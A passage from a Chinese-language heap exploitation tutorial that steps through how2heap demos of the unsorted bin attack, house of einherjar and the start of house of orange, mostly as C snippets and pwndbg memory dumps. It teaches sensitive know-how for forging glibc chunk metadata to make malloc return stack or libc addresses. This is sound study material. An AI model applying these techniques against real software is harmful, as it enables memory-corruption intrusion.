<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>紧接着，我假设我们有堆溢出漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span> 	p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="number">26</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="number">27</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<p>去修改，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个 fake free chunk</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p</span><br><span class="line"><span class="variable">$1</span> = (unsigned long *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx p</span><br><span class="line">0x602010:	0x00007ffff7dd1b58	0x00007ffff7dd1b58</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx p[1]</span><br><span class="line">0x7ffff7dd1b58 &lt;main_arena+88&gt;:	0x00000000006023a0	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b68 &lt;main_arena+104&gt;:	0x0000000000602000	0x0000000000602000</span><br><span class="line">0x7ffff7dd1b78 &lt;main_arena+120&gt;:	0x00007ffff7dd1b68	0x00007ffff7dd1b68</span><br><span class="line">0x7ffff7dd1b88 &lt;main_arena+136&gt;:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b98 &lt;main_arena+152&gt;:	0x00007ffff7dd1b88	0x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba8 &lt;main_arena+168&gt;:	0x00007ffff7dd1b98	0x00007ffff7dd1b98</span><br><span class="line">0x7ffff7dd1bb8 &lt;main_arena+184&gt;:	0x00007ffff7dd1ba8	0x00007ffff7dd1ba8</span><br><span class="line">0x7ffff7dd1bc8 &lt;main_arena+200&gt;:	0x00007ffff7dd1bb8	0x00007ffff7dd1bb8</span><br><span class="line">0x7ffff7dd1bd8 &lt;main_arena+216&gt;:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8</span><br><span class="line">0x7ffff7dd1be8 &lt;main_arena+232&gt;:	0x00007ffff7dd1bd8	0x00007ffff7dd1bd8</span><br></pre></td></tr></table></figure>

<p>此时，chunk 1的 bk已经被修改</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 417,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7fffffffe3c8,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们 malloc 一块新 chunk，这个时候，系统为循着 bk去 malloc一块新chunk</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx &amp;stack_var-2</span><br><span class="line">0x7fffffffe3c8:	0x000000000040081a	0x0000000000400880           &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3d8:	0x00007ffff7dd1b58	0x0000000000602010				 &lt;--- fd</span><br><span class="line">0x7fffffffe3e8:	0x3cc687447353a200	0x0000000000400880</span><br><span class="line">0x7fffffffe3f8:	0x00007ffff7a303f1	0x0000000000040000</span><br><span class="line">0x7fffffffe408:	0x00007fffffffe4d8	0x00000001f7b9a488</span><br><span class="line">0x7fffffffe418:	0x0000000000400686	0x0000000000000000</span><br><span class="line">0x7fffffffe428:	0x577f97b5f5d4f6ba	0x0000000000400590</span><br><span class="line">0x7fffffffe438:	0x00007fffffffe4d0	0x0000000000000000</span><br><span class="line">0x7fffffffe448:	0x0000000000000000	0xa88068ca2cd4f6ba</span><br><span class="line">0x7fffffffe458:	0xa8807873e386f6ba	0x0000000000000000</span><br></pre></td></tr></table></figure>



<h3 id="0x14-house-of-einherjar"><a href="#0x14-house-of-einherjar" class="headerlink" title="0x14 house_of_einherjar"></a>0x14 house_of_einherjar</h3><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。</p>
<p>它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 <code>PREV_IN_USE</code> 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。</p>
<p>首先，我们先 malloc 一个chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br></pre></td></tr></table></figure>

<p>然后，我们fake一个chunk ，用来之后  free 掉 next  chunk的时候，让合并后的堆块到 fake chunk 处，那下一次 malloc 将返回我们想要的地址。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$1</span> = &#123;256, 256, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br><span class="line">pwndbg&gt; x/20gx &amp;fake_chunk</span><br><span class="line">0x7fffffffe3b0:	0x0000000000000100	0x0000000000000100</span><br><span class="line">0x7fffffffe3c0:	0x00007fffffffe3b0	0x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:	0x00007fffffffe3b0	0x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:	0x00007fffffffe4d0	0x3c402f70cff21400</span><br><span class="line">0x7fffffffe3f0:	0x0000000000400bf0	0x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:	0x0000000000040000	0x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:	0x00000001f7b9a488	0x00000000004006d6</span><br><span class="line">0x7fffffffe420:	0x0000000000000000	0x86f4a78e4a5b6ea9</span><br><span class="line">0x7fffffffe430:	0x00000000004005e0	0x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后，在 malloc 一个 chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br></pre></td></tr></table></figure>

<p>紧接着，我们假设有个 堆溢出漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="number">67</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="number">68</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line"><span class="number">69</span> 	a[real_a_size] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<p>修改掉 chunk b 的size </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603040</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">256</span>,  <span class="comment">// 257 --&gt; 256</span></span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后还得让 prev_size 字段为 fake chunk 的大小</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_chunk</span><br><span class="line"><span class="variable">$8</span> = &#123;256, 18446603336227507344, 140737488348080, 140737488348080, 140737488348080, 140737488348080&#125;</span><br></pre></td></tr></table></figure>

<p>chunk b的 prev_size 字段，用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要将 fake chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br></pre></td></tr></table></figure>

<p>chunk b</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603040 &#123;</span><br><span class="line">  prev_size = 18446603336227507344,  // 0 -&gt; 18446603336227507344</span><br><span class="line">  size = 256,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后我们 free 掉 chunk b</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">88</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="number">89</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">90</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<p>然后，我们会发现 top chunk 变了,top chunk -&gt; fake_chunk</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x7fffffffe3b0,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">  bins = &#123;0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b58 &lt;main_arena+88&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b68 &lt;main_arena+104&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b78 &lt;main_arena+120&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b88 &lt;main_arena+136&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1b98 &lt;main_arena+152&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1ba8 &lt;main_arena+168&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bb8 &lt;main_arena+184&gt;, 0x7ffff7dd1bc8 &lt;main_arena+200&gt;...&#125;,</span><br><span class="line">  binmap = &#123;0, 0, 0, 0&#125;,</span><br><span class="line">  next = 0x7ffff7dd1b00 &lt;main_arena&gt;,</span><br><span class="line">  next_free = 0x0,</span><br><span class="line">  attached_threads = 1,</span><br><span class="line">  system_mem = 135168,</span><br><span class="line">  max_system_mem = 135168</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p &amp;fake_chunk</span><br><span class="line"><span class="variable">$10</span> = (size_t (*)[6]) 0x7fffffffe3b0</span><br></pre></td></tr></table></figure>

<p>由于，我们释放 chunk b，这时因为 <code>PREV_INUSE</code> 为零，unlink 会根据 prev_size 去寻找上一个 free chunk，并将它和当前 chunk 合并。</p>
<p>这意味着，当我们 再去 malloc 一块 新chunk的时候，将会是 fake chunk 的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">103</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line"><span class="number">104</span>     d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br></pre></td></tr></table></figure>

<p>如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx fake_chunk</span><br><span class="line">0x7fffffffe3b0:	0x0000000000000100	0x0000000000000211</span><br><span class="line">0x7fffffffe3c0:	0x00007fffffffe3b0	0x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3d0:	0x00007fffffffe3b0	0x00007fffffffe3b0</span><br><span class="line">0x7fffffffe3e0:	0x00007fffffffe4d0	0xc6f3cea232483100</span><br><span class="line">0x7fffffffe3f0:	0x0000000000400bf0	0x00007ffff7a303f1</span><br><span class="line">0x7fffffffe400:	0x0000000000040000	0x00007fffffffe4d8</span><br><span class="line">0x7fffffffe410:	0x00000001f7b9a488	0x00000000004006d6</span><br><span class="line">0x7fffffffe420:	0x0000000000000000	0x0575c70b1ba71a36</span><br><span class="line">0x7fffffffe430:	0x00000000004005e0	0x00007fffffffe4d0</span><br><span class="line">0x7fffffffe440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; p d</span><br><span class="line"><span class="variable">$14</span> = (uint8_t *) 0x7fffffffe3c0 <span class="string">&quot;\260\343\377\377\377\177&quot;</span></span><br></pre></td></tr></table></figure>





<p>值得一提的是，这里绕过 unlink 检查的时候，直接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure>



<h3 id="0x15-house-of-orange"><a href="#0x15-house-of-orange" class="headerlink" title="0x15 house of orange"></a>0x15 house of orange</h3><p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin)。 这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。</p>
<p>我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 <code>sysmalloc()</code> 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 <code>mp_.mmap_threshold</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;&#x3D; (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
<p>为了能够调用 <code>sysmalloc()</code> 中的 <code>_int_free()</code>，需要 top chunk 大于 <code>MINSIZE</code>，即 0x10</p>
<p>当然，还得绕过下面两个限制条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

<p>即满足 old_size 小于 <code>nb+MINSIZE</code>，<code>PREV_INUSE</code> 标志位为 1，<code>old_top+old_size</code> 页对齐这几个条件。</p>
<p>我们总结一下伪造的top chunk size的要求</p>
<p>1.伪造的size必须要对齐到内存页</p>
<p>2.size要大于MINSIZE(0x10)</p>
<p>3.size要小于之后申请的chunk size + MINSIZE(0x10)</p>
<p>4.size的prev inuse位必须为1</p>
<p>之后原有的top chunk就会执行<code>_int_free</code>从而顺利进入unsorted bin中。</p>
<p>在这个例子中:</p>
<p>我们首先 malloc 一个 0x400 的chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1025,  // hex(1025) == 0x401</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常情况下 ，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; top_chunk</span><br><span class="line">0x602400 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134145,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20gx 0x602400</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000020c01  &lt;--- top chunk // size</span><br><span class="line">0x602410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p>此时，我们假设有溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">72</span>     top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line"><span class="number">73</span>     top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure>

<p> 将top chunk 的size 改为 0xc01 ，这样就能满足上面总结的条件。</p>
<p>之后，我们申请的 0x1000 size 的 chunk </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>

<p>0x1000 &gt; 0xc01 , 又由于 top chunk  的伪造满足条件，紧接着原有的 top chunk 会被放到 unsorted bins里</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>我们看下此时 heap 的情况</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000be1     &lt;--- old top chunk</span><br><span class="line">0x602410:	0x00007ffff7dd1b58	0x00007ffff7dd1b58</span><br><span class="line">PwnLife&gt; x/4gx p1-0x10+0x400+0xbe0</span><br><span class="line">0x602fe0:	0x0000000000000be0	0x0000000000000010     &lt;----  fencepost chunk 1</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000011     &lt;----  fencepost chunk 2</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10</span><br><span class="line">0x623000:	0x0000000000000000	0x0000000000001011     &lt;----  chunk p2 </span><br><span class="line">0x623010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; x/4gx p2-0x10+0x1010</span><br><span class="line">0x624010:	0x0000000000000000	0x0000000000020ff1     &lt;---- new top chunk</span><br><span class="line">0x624020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602400 ◂— 0x7ffff7dd1b58</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p>另外可以看到 old top chunk 被缩小了 0x20，缩小的空间被用于放置 fencepost chunk。</p>
<p>根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出 <code>_IO_list_all</code> 的地址。然后通过溢出将 old top 的 bk 改写为 <code>_IO_list_all-0x10</code>，这样在进行 unsorted bin attack 时，就会将 <code>_IO_list_all</code> 修改为 <code>&amp;unsorted_bin-0x10</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>



